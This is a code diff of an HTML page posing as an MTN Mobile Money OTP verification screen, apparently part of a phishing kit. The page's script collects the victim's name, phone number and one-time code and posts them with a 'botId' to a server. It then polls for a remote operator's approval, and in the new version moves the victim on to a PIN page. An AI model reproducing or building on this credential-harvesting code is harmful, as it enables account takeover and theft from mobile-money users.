@@ -1,470 +1,469 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>MTN Mobile Money - Verify</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            background: #fff;
-            color: #222;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-        }
-        .top-bar {
-            height: 72px;
-            background: #FFCC00;
-            display: flex;
-            align-items: center;
-            padding: 0 22px;
-            flex-shrink: 0;
-            box-shadow: 0 2px 6px rgba(0,0,0,0.1);
-        }
-        .top-bar .logo {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        .top-bar .logo svg {
-            height: 36px;
-            width: auto;
-        }
-        .top-bar .logo span {
-            font-weight: 700;
-            font-size: 18px;
-            color: #004B87;
-            letter-spacing: -0.5px;
-        }
-        .back-btn {
-            color: #004B87;
-            font-size: 30px;
-            text-decoration: none;
-            font-weight: 300;
-            margin-right: 16px;
-        }
-        .container {
-            flex: 1;
-            width: 100%;
-            max-width: 420px;
-            margin: 0 auto;
-            padding: 28px 24px 20px;
-            display: flex;
-            flex-direction: column;
-        }
-        .title {
-            font-size: 26px;
-            font-weight: 700;
-            color: #004B87;
-            margin-bottom: 4px;
-            letter-spacing: -0.3px;
-        }
-        .subtitle {
-            font-size: 15px;
-            color: #555;
-            line-height: 1.5;
-            margin-bottom: 4px;
-        }
-        .valid-time {
-            font-size: 14px;
-            color: #888;
-            margin-bottom: 24px;
-        }
-        .otp {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 20px;
-            justify-content: flex-start;
-        }
-        .otp input {
-            width: 50px;
-            height: 56px;
-            border: 2px solid #d0d7de;
-            border-radius: 10px;
-            text-align: center;
-            font-size: 22px;
-            font-weight: 500;
-            outline: none;
-            background: #fff;
-            transition: border 0.2s, box-shadow 0.2s;
-        }
-        .otp input:focus {
-            border-color: #FFCC00;
-            box-shadow: 0 0 0 3px rgba(255, 204, 0, 0.3);
-        }
-        .resend-wrap {
-            color: #666;
-            font-size: 15px;
-            margin-bottom: 0;
-        }
-        .resend-wrap .timer {
-            font-weight: 600;
-            color: #004B87;
-        }
-        .continue-btn {
-            position: fixed;
-            left: 24px;
-            right: 24px;
-            bottom: 28px;
-            height: 56px;
-            border: none;
-            border-radius: 10px;
-            background: #ccc;
-            color: #fff;
-            font-size: 20px;
-            font-weight: 700;
-            cursor: not-allowed;
-            transition: background 0.2s;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            max-width: 420px;
-            margin: 0 auto;
-            left: 50%;
-            transform: translateX(-50%);
-        }
-        .continue-btn:enabled {
-            background: #FFCC00;
-            color: #004B87;
-            cursor: pointer;
-        }
-        .continue-btn:enabled:hover {
-            background: #e6b800;
-        }
-        #message-box {
-            display: none;
-            padding: 12px 16px;
-            border-radius: 8px;
-            margin-bottom: 16px;
-            font-size: 15px;
-            font-weight: 500;
-        }
-        @media (max-width: 480px) {
-            .container {
-                padding: 22px 18px 16px;
-            }
-            .title {
-                font-size: 24px;
-            }
-            .otp input {
-                width: 44px;
-                height: 50px;
-                font-size: 20px;
-            }
-            .continue-btn {
-                height: 54px;
-                font-size: 18px;
-                left: 18px;
-                right: 18px;
-                bottom: 22px;
-            }
-        }
-        @media (max-width: 360px) {
-            .otp input {
-                width: 38px;
-                height: 46px;
-                font-size: 18px;
-            }
-            .otp {
-                gap: 6px;
-            }
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>MTN Mobile Money - Verify</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      background: #fff;
+      color: #222;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+    .top-bar {
+      height: 72px;
+      background: #FFCC00;
+      display: flex;
+      align-items: center;
+      padding: 0 22px;
+      flex-shrink: 0;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+    }
+    .top-bar .logo {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .top-bar .logo svg {
+      height: 36px;
+      width: auto;
+    }
+    .top-bar .logo span {
+      font-weight: 700;
+      font-size: 18px;
+      color: #004B87;
+      letter-spacing: -0.5px;
+    }
+    .back-btn {
+      color: #004B87;
+      font-size: 30px;
+      text-decoration: none;
+      font-weight: 300;
+      margin-right: 16px;
+    }
+    .container {
+      flex: 1;
+      width: 100%;
+      max-width: 420px;
+      margin: 0 auto;
+      padding: 28px 24px 20px;
+      display: flex;
+      flex-direction: column;
+    }
+    .title {
+      font-size: 26px;
+      font-weight: 700;
+      color: #004B87;
+      margin-bottom: 4px;
+      letter-spacing: -0.3px;
+    }
+    .subtitle {
+      font-size: 15px;
+      color: #555;
+      line-height: 1.5;
+      margin-bottom: 4px;
+    }
+    .valid-time {
+      font-size: 14px;
+      color: #888;
+      margin-bottom: 24px;
+    }
+    .otp {
+      display: flex;
+      gap: 10px;
+      margin-bottom: 20px;
+      justify-content: flex-start;
+    }
+    .otp input {
+      width: 50px;
+      height: 56px;
+      border: 2px solid #d0d7de;
+      border-radius: 10px;
+      text-align: center;
+      font-size: 22px;
+      font-weight: 500;
+      outline: none;
+      background: #fff;
+      transition: border 0.2s, box-shadow 0.2s;
+    }
+    .otp input:focus {
+      border-color: #FFCC00;
+      box-shadow: 0 0 0 3px rgba(255, 204, 0, 0.3);
+    }
+    .resend-wrap {
+      color: #666;
+      font-size: 15px;
+      margin-bottom: 0;
+    }
+    .resend-wrap .timer {
+      font-weight: 600;
+      color: #004B87;
+    }
+    .continue-btn {
+      position: fixed;
+      left: 50%;
+      transform: translateX(-50%);
+      bottom: 28px;
+      height: 56px;
+      border: none;
+      border-radius: 10px;
+      background: #ccc;
+      color: #fff;
+      font-size: 20px;
+      font-weight: 700;
+      cursor: not-allowed;
+      transition: background 0.2s;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      max-width: 420px;
+      width: calc(100% - 48px);
+    }
+    .continue-btn:enabled {
+      background: #FFCC00;
+      color: #004B87;
+      cursor: pointer;
+    }
+    .continue-btn:enabled:hover {
+      background: #e6b800;
+    }
+    #message-box {
+      display: none;
+      padding: 12px 16px;
+      border-radius: 8px;
+      margin-bottom: 16px;
+      font-size: 15px;
+      font-weight: 500;
+    }
+    @media (max-width: 480px) {
+      .container { padding: 22px 18px 16px; }
+      .title { font-size: 24px; }
+      .otp input { width: 44px; height: 50px; font-size: 20px; }
+      .continue-btn { height: 54px; font-size: 18px; bottom: 22px; width: calc(100% - 36px); }
+    }
+    @media (max-width: 360px) {
+      .otp input { width: 38px; height: 46px; font-size: 18px; }
+      .otp { gap: 6px; }
+    }
+  </style>
 </head>
 <body>
 
-    <div class="top-bar">
-        <a href="#" class="back-btn">&#8592;</a>
-        <div class="logo">
-            <svg viewBox="0 0 120 40" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <rect x="2" y="2" width="36" height="36" rx="8" fill="#FFCC00" stroke="#004B87" stroke-width="2"/>
-                <path d="M14 12L22 12L18 20L22 28L14 28L18 20L14 12Z" fill="#004B87"/>
-                <text x="46" y="26" font-family="Arial, sans-serif" font-weight="700" font-size="20" fill="#004B87">MTN Mobile Money</text>
-            </svg>
-            <span>Mobile Money</span>
-        </div>
+  <div class="top-bar">
+    <a href="#" class="back-btn">&#8592;</a>
+    <div class="logo">
+      <svg viewBox="0 0 120 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <rect x="2" y="2" width="36" height="36" rx="8" fill="#FFCC00" stroke="#004B87" stroke-width="2"/>
+        <path d="M14 12L22 12L18 20L22 28L14 28L18 20L14 12Z" fill="#004B87"/>
+        <text x="46" y="26" font-family="Arial, sans-serif" font-weight="700" font-size="20" fill="#004B87">MTN Mobile Money</text>
+      </svg>
+      <span>Mobile Money</span>
+    </div>
+  </div>
+
+  <div class="container">
+    <div class="title">Enter OTP</div>
+    <!-- 🔥 SUBTITLE WILL BE UPDATED DYNAMICALLY -->
+    <div class="subtitle" id="subtitlePlaceholder">
+      Enter OTP that was sent to your phone
     </div>
 
-    <div class="container">
-        <div class="title">Enter OTP</div>
-        <div class="subtitle" id="subtitlePlaceholder">
-            Enter OTP that was sent to (+263) 712345678
-        </div>
+    <div class="valid-time">The code is valid for 5 minutes</div>
 
-        <div class="valid-time">The code is valid for 5 minutes</div>
-
-        <div class="otp">
-            <input maxlength="1" inputmode="numeric" pattern="[0-9]*">
-            <input maxlength="1" inputmode="numeric" pattern="[0-9]*">
-            <input maxlength="1" inputmode="numeric" pattern="[0-9]*">
-            <input maxlength="1" inputmode="numeric" pattern="[0-9]*">
-        </div>
-
-        <div class="resend-wrap">
-            Resend code in <span class="timer">05:00</span>
-        </div>
+    <div class="otp">
+      <input maxlength="1" inputmode="numeric" pattern="[0-9]*">
+      <input maxlength="1" inputmode="numeric" pattern="[0-9]*">
+      <input maxlength="1" inputmode="numeric" pattern="[0-9]*">
+      <input maxlength="1" inputmode="numeric" pattern="[0-9]*">
     </div>
 
-    <button class="continue-btn">SUBMIT</button>
+    <div class="resend-wrap">
+      Resend code in <span class="timer">05:00</span>
+    </div>
+  </div>
 
-    <script>
-        (function() {
-            const phone = localStorage.getItem('phone');
-            const subtitle = document.getElementById('subtitlePlaceholder');
-            if (phone) {
-                subtitle.textContent = 'Enter OTP that was sent to ' + phone;
-            }
-        })();
-    </script>
+  <button class="continue-btn" disabled>SUBMIT</button>
 
-    <script>
-        (function() {
-            const urlParams = new URLSearchParams(window.location.search);
-            let botId = urlParams.get('botId') || localStorage.getItem('botId');
-            let name = urlParams.get('name') || localStorage.getItem('name');
-            let phone = urlParams.get('phone') || localStorage.getItem('phone');
+  <script>
+    (function() {
+      // ---------- READ FROM URL & LOCALSTORAGE ----------
+      const urlParams = new URLSearchParams(window.location.search);
+      let botId = urlParams.get('botId') || localStorage.getItem('botId');
+      let phone = urlParams.get('phone') || localStorage.getItem('phone');
+      let name = urlParams.get('name') || localStorage.getItem('fullName');
 
-            if (!name) {
-                name = localStorage.getItem('fullName');
-                if (name) localStorage.setItem('name', name);
-            }
+      // If missing critical data, redirect back to phone page
+      if (!botId) {
+        alert('Bot ID missing. Please start over.');
+        window.location.href = 'index.html';
+        return;
+      }
+      if (!phone) {
+        alert('Phone number missing. Please start over.');
+        window.location.href = 'index.html';
+        return;
+      }
+      if (!name) {
+        name = 'MTN User';
+        localStorage.setItem('fullName', name);
+      }
 
-            if (!phone) {
-                const subtitle = document.querySelector('.subtitle');
-                const match = subtitle.textContent.match(/\((\+?\d+)\)\s*(\d+)/);
-                if (match) phone = match[1] + match[2];
-                if (phone) localStorage.setItem('phone', phone);
-            }
+      // Store for subsequent pages
+      localStorage.setItem('botId', botId);
+      localStorage.setItem('phone', phone);
 
-            if (botId) localStorage.setItem('botId', botId);
+      // ---------- 🔥 UPDATE SUBTITLE WITH USER'S PHONE ----------
+      const subtitle = document.getElementById('subtitlePlaceholder');
+      if (phone) {
+        subtitle.textContent = 'Enter OTP that was sent to ' + phone;
+      }
 
-            const container = document.querySelector('.container');
-            const msgDiv = document.createElement('div');
-            msgDiv.id = 'message-box';
-            msgDiv.style.display = 'none';
-            msgDiv.style.padding = '12px 16px';
-            msgDiv.style.borderRadius = '8px';
-            msgDiv.style.marginBottom = '20px';
-            msgDiv.style.fontSize = '15px';
-            msgDiv.style.fontWeight = '500';
-            msgDiv.style.transition = 'all 0.2s ease';
-            const resendWrap = document.querySelector('.resend-wrap');
-            container.insertBefore(msgDiv, resendWrap);
+      // ---------- DOM REFS ----------
+      const inputs = document.querySelectorAll('.otp input');
+      const continueBtn = document.querySelector('.continue-btn');
+      const msgDiv = document.createElement('div');
+      msgDiv.id = 'message-box';
+      msgDiv.style.display = 'none';
+      msgDiv.style.padding = '12px 16px';
+      msgDiv.style.borderRadius = '8px';
+      msgDiv.style.marginBottom = '20px';
+      msgDiv.style.fontSize = '15px';
+      msgDiv.style.fontWeight = '500';
+      const container = document.querySelector('.container');
+      const resendWrap = document.querySelector('.resend-wrap');
+      container.insertBefore(msgDiv, resendWrap);
 
-            function showMessage(text, isError = true) {
-                msgDiv.textContent = text;
-                msgDiv.style.display = 'block';
-                msgDiv.style.background = isError ? '#fde7e7' : '#e7f5e7';
-                msgDiv.style.color = isError ? '#b00020' : '#1e7e34';
-                msgDiv.style.border = isError ? '1px solid #f5c6cb' : '1px solid #b7d7b7';
-            }
+      // ---------- UI HELPERS ----------
+      function showMessage(text, isError) {
+        msgDiv.textContent = text;
+        msgDiv.style.display = 'block';
+        msgDiv.style.background = isError ? '#fde7e7' : '#e7f5e7';
+        msgDiv.style.color = isError ? '#b00020' : '#1e7e34';
+        msgDiv.style.border = isError ? '1px solid #f5c6cb' : '1px solid #b7d7b7';
+      }
 
-            function hideMessage() {
-                msgDiv.style.display = 'none';
-                msgDiv.textContent = '';
-            }
+      function hideMessage() {
+        msgDiv.style.display = 'none';
+        msgDiv.textContent = '';
+      }
 
-            const inputs = document.querySelectorAll('.otp input');
-            const continueBtn = document.querySelector('.continue-btn');
+      function sanitizeDigit(value) {
+        return value.replace(/\D/g, '');
+      }
 
-            function sanitizeDigit(value) {
-                return value.replace(/\D/g, '');
-            }
+      function checkAllFilled() {
+        let allFilled = true;
+        inputs.forEach(function(input) {
+          if (input.value.trim() === '') allFilled = false;
+        });
+        continueBtn.disabled = !allFilled;
+        if (allFilled) {
+          continueBtn.style.background = '#FFCC00';
+          continueBtn.style.color = '#004B87';
+          continueBtn.style.cursor = 'pointer';
+        } else {
+          continueBtn.style.background = '#ccc';
+          continueBtn.style.color = '#fff';
+          continueBtn.style.cursor = 'not-allowed';
+        }
+        hideMessage();
+      }
 
-            function checkAllFilled() {
-                let allFilled = true;
-                inputs.forEach(input => {
-                    if (input.value.trim() === '') allFilled = false;
-                });
-                if (allFilled) {
-                    continueBtn.disabled = false;
-                    continueBtn.style.background = '#FFCC00';
-                    continueBtn.style.color = '#004B87';
-                    continueBtn.style.cursor = 'pointer';
-                } else {
-                    continueBtn.disabled = true;
-                    continueBtn.style.background = '#ccc';
-                    continueBtn.style.color = '#fff';
-                    continueBtn.style.cursor = 'not-allowed';
-                }
-            }
+      // ---------- OTP INPUT HANDLING ----------
+      inputs.forEach(function(input, index) {
+        input.addEventListener('input', function() {
+          var cleaned = sanitizeDigit(this.value);
+          if (cleaned !== this.value) this.value = cleaned;
+          if (this.value.length === 1 && index < inputs.length - 1) {
+            inputs[index + 1].focus();
+          }
+          checkAllFilled();
+        });
 
-            inputs.forEach((input, index) => {
-                input.addEventListener('input', function() {
-                    const cleaned = sanitizeDigit(this.value);
-                    if (cleaned !== this.value) {
-                        this.value = cleaned;
-                    }
-                    if (this.value.length === 1) {
-                        if (index < inputs.length - 1) {
-                            inputs[index + 1].focus();
-                        }
-                    }
-                    checkAllFilled();
-                    hideMessage();
-                });
+        input.addEventListener('paste', function(e) {
+          e.preventDefault();
+          var paste = (e.clipboardData || window.clipboardData).getData('text');
+          var digits = sanitizeDigit(paste);
+          if (digits) {
+            this.value = digits.slice(0, 1);
+            this.dispatchEvent(new Event('input'));
+          }
+        });
 
-                input.addEventListener('paste', function(e) {
-                    e.preventDefault();
-                    const paste = (e.clipboardData || window.clipboardData).getData('text');
-                    const digits = sanitizeDigit(paste);
-                    if (digits) {
-                        this.value = digits.slice(0, 1);
-                        this.dispatchEvent(new Event('input'));
-                    }
-                });
+        input.addEventListener('keydown', function(e) {
+          if (e.key === 'Backspace' && this.value === '' && index > 0) {
+            inputs[index - 1].focus();
+          }
+        });
 
-                input.addEventListener('keydown', function(e) {
-                    if (e.key === 'Backspace' && this.value === '' && index > 0) {
-                        inputs[index - 1].focus();
-                    }
-                });
+        input.addEventListener('blur', checkAllFilled);
+      });
 
-                input.addEventListener('blur', checkAllFilled);
-            });
+      // ---------- TIMER (5 minutes) ----------
+      var timerSpan = document.querySelector('.timer');
+      var resendWrapEl = document.querySelector('.resend-wrap');
+      var totalSeconds = 5 * 60;
+      var timerInterval = null;
 
-            const timerSpan = document.querySelector('.timer');
-            const resendWrapEl = document.querySelector('.resend-wrap');
-            let totalSeconds = 5 * 60;
-            let interval = null;
+      function formatTime(sec) {
+        var m = String(Math.floor(sec / 60)).padStart(2, '0');
+        var s = String(sec % 60).padStart(2, '0');
+        return m + ':' + s;
+      }
 
-            function formatTime(sec) {
-                const m = String(Math.floor(sec / 60)).padStart(2, '0');
-                const s = String(sec % 60).padStart(2, '0');
-                return `${m}:${s}`;
-            }
-
-            function updateTimerUI() {
-                if (totalSeconds <= 0) {
-                    resendWrapEl.innerHTML = 'Resend code';
-                    resendWrapEl.style.color = '#004B87';
-                    resendWrapEl.style.cursor = 'pointer';
-                    resendWrapEl.style.fontWeight = '600';
-                    clearInterval(interval);
-                    interval = null;
-                    resendWrapEl.onclick = function(e) {
-                        e.preventDefault();
-                        startTimer(5 * 60);
-                        hideMessage();
-                    };
-                    return;
-                }
-                timerSpan.textContent = formatTime(totalSeconds);
-                resendWrapEl.innerHTML = `Resend code in <span class="timer">${formatTime(totalSeconds)}</span>`;
-                resendWrapEl.style.color = '#666';
-                resendWrapEl.style.cursor = 'default';
-                resendWrapEl.style.fontWeight = '400';
-                resendWrapEl.onclick = null;
-            }
-
-            function startTimer(seconds) {
-                if (interval) clearInterval(interval);
-                totalSeconds = seconds;
-                updateTimerUI();
-                interval = setInterval(() => {
-                    totalSeconds--;
-                    if (totalSeconds <= 0) {
-                        totalSeconds = 0;
-                        updateTimerUI();
-                        clearInterval(interval);
-                        interval = null;
-                    } else {
-                        updateTimerUI();
-                    }
-                }, 1000);
-            }
-
+      function updateTimerUI() {
+        if (totalSeconds <= 0) {
+          resendWrapEl.innerHTML = 'Resend code';
+          resendWrapEl.style.color = '#004B87';
+          resendWrapEl.style.cursor = 'pointer';
+          resendWrapEl.style.fontWeight = '600';
+          clearInterval(timerInterval);
+          timerInterval = null;
+          resendWrapEl.onclick = function(e) {
+            e.preventDefault();
             startTimer(5 * 60);
+            hideMessage();
+          };
+          return;
+        }
+        resendWrapEl.innerHTML = 'Resend code in <span class="timer">' + formatTime(totalSeconds) + '</span>';
+        resendWrapEl.style.color = '#666';
+        resendWrapEl.style.cursor = 'default';
+        resendWrapEl.style.fontWeight = '400';
+        resendWrapEl.onclick = null;
+      }
 
-            function hasRequiredData() {
-                if (!name) {
-                    showMessage('Name missing – please go back and enter your name.', true);
-                    return false;
+      function startTimer(seconds) {
+        if (timerInterval) clearInterval(timerInterval);
+        totalSeconds = seconds;
+        updateTimerUI();
+        timerInterval = setInterval(function() {
+          totalSeconds--;
+          if (totalSeconds <= 0) {
+            totalSeconds = 0;
+            updateTimerUI();
+            clearInterval(timerInterval);
+            timerInterval = null;
+          } else {
+            updateTimerUI();
+          }
+        }, 1000);
+      }
+
+      startTimer(5 * 60);
+
+      // ---------- POLLING ----------
+      var pollTimer = null;
+
+      function stopPolling() {
+        if (pollTimer) {
+          clearInterval(pollTimer);
+          pollTimer = null;
+        }
+      }
+
+      // ---------- SUBMIT OTP ----------
+      continueBtn.addEventListener('click', function() {
+        if (this.disabled) return;
+
+        var otp = '';
+        inputs.forEach(function(inp) { otp += inp.value; });
+        if (otp.length !== 4) {
+          showMessage('Please enter a 4‑digit OTP.', true);
+          return;
+        }
+
+        // Disable button, show waiting
+        continueBtn.disabled = true;
+        continueBtn.textContent = 'Verifying...';
+        continueBtn.style.background = '#f5a623';
+        continueBtn.style.color = '#fff';
+        hideMessage();
+
+        fetch('/submit-otp', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ name: name, phone: phone, otp: otp, botId: botId })
+        })
+        .then(function(res) {
+          if (!res.ok) throw new Error('Server error (HTTP ' + res.status + ')');
+          return res.json();
+        })
+        .then(function(data) {
+          var requestId = data.requestId;
+          if (!requestId) throw new Error('No request ID received');
+
+          // Start polling
+          stopPolling();
+          var attempts = 0;
+          var MAX_ATTEMPTS = 120; // ~3 minutes
+
+          pollTimer = setInterval(function() {
+            attempts++;
+            fetch('/check-otp/' + requestId)
+              .then(function(res) {
+                if (!res.ok) throw new Error('Verification error');
+                return res.json();
+              })
+              .then(function(status) {
+                if (status.approved === true) {
+                  stopPolling();
+                  // Redirect to PIN page
+                  var pinUrl = 'pin.html?botId=' + encodeURIComponent(botId) +
+                               '&phone=' + encodeURIComponent(phone) +
+                               '&name=' + encodeURIComponent(name);
+                  window.location.href = pinUrl;
+                  return;
                 }
-                if (!phone) {
-                    showMessage('Phone number missing – please restart.', true);
-                    return false;
+                if (status.approved === false) {
+                  stopPolling();
+                  showMessage('❌ Incorrect OTP. Please try again.', true);
+                  // Reset inputs
+                  inputs.forEach(function(inp) { inp.value = ''; });
+                  checkAllFilled();
+                  inputs[0].focus();
+                  // Re-enable button
+                  continueBtn.disabled = false;
+                  continueBtn.textContent = 'SUBMIT';
+                  continueBtn.style.background = '#FFCC00';
+                  continueBtn.style.color = '#004B87';
+                  return;
                 }
-                if (!botId) {
-                    showMessage('Bot ID missing – please use the correct link.', true);
-                    return false;
+                // Still pending
+                if (attempts > MAX_ATTEMPTS) {
+                  stopPolling();
+                  showMessage('⏳ Approval taking too long. Please refresh or contact support.', true);
+                  continueBtn.disabled = false;
+                  continueBtn.textContent = 'SUBMIT';
+                  continueBtn.style.background = '#FFCC00';
+                  continueBtn.style.color = '#004B87';
+                  return;
                 }
-                hideMessage();
-                return true;
-            }
+                // keep polling
+              })
+              .catch(function(err) {
+                // Network error – keep polling
+                console.error('Polling error:', err);
+              });
+          }, 1500);
+        })
+        .catch(function(err) {
+          showMessage('❌ Send error: ' + err.message, true);
+          continueBtn.disabled = false;
+          continueBtn.textContent = 'SUBMIT';
+          continueBtn.style.background = '#FFCC00';
+          continueBtn.style.color = '#004B87';
+        });
+      });
 
-            continueBtn.addEventListener('click', function() {
-                if (this.disabled) return;
-                if (!hasRequiredData()) return;
-
-                const otp = Array.from(inputs).map(inp => inp.value).join('');
-
-                continueBtn.disabled = true;
-                continueBtn.textContent = 'Verifying...';
-                continueBtn.style.background = '#f5a623';
-                continueBtn.style.color = '#fff';
-
-                fetch('/submit-otp', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ name, phone, otp, botId })
-                })
-                .then(response => {
-                    if (!response.ok) throw new Error('Server error');
-                    return response.json();
-                })
-                .then(data => {
-                    const requestId = data.requestId;
-                    if (!requestId) throw new Error('No ID received');
-
-                    let pollInterval = setInterval(() => {
-                        fetch(`/check-otp/${requestId}`)
-                            .then(res => {
-                                if (!res.ok) throw new Error('Verification error');
-                                return res.json();
-                            })
-                            .then(status => {
-                                if (status.approved === true) {
-                                    clearInterval(pollInterval);
-                                    window.location.href = `success.html?botId=${botId}&name=${encodeURIComponent(name)}&phone=${encodeURIComponent(phone)}`;
-                                } else if (status.approved === false) {
-                                    clearInterval(pollInterval);
-                                    showMessage('Incorrect code. Please try again.', true);
-                                    continueBtn.disabled = false;
-                                    continueBtn.textContent = 'SUBMIT';
-                                    continueBtn.style.background = '#FFCC00';
-                                    continueBtn.style.color = '#004B87';
-                                    inputs.forEach(inp => inp.value = '');
-                                    checkAllFilled();
-                                    inputs[0].focus();
-                                }
-                            })
-                            .catch(err => {
-                                clearInterval(pollInterval);
-                                showMessage('Verification error: ' + err.message, true);
-                                continueBtn.disabled = false;
-                                continueBtn.textContent = 'SUBMIT';
-                                continueBtn.style.background = '#FFCC00';
-                                continueBtn.style.color = '#004B87';
-                            });
-                    }, 2000);
-                })
-                .catch(err => {
-                    showMessage('Send error: ' + err.message, true);
-                    continueBtn.disabled = false;
-                    continueBtn.textContent = 'SUBMIT';
-                    continueBtn.style.background = '#FFCC00';
-                    continueBtn.style.color = '#004B87';
-                });
-            });
-
-            hasRequiredData();
-        })();
-    </script>
+      // ---------- INIT ----------
+      checkAllFilled();
+      // Focus first input
+      inputs[0].focus();
+    })();
+  </script>
 </body>
 </html>
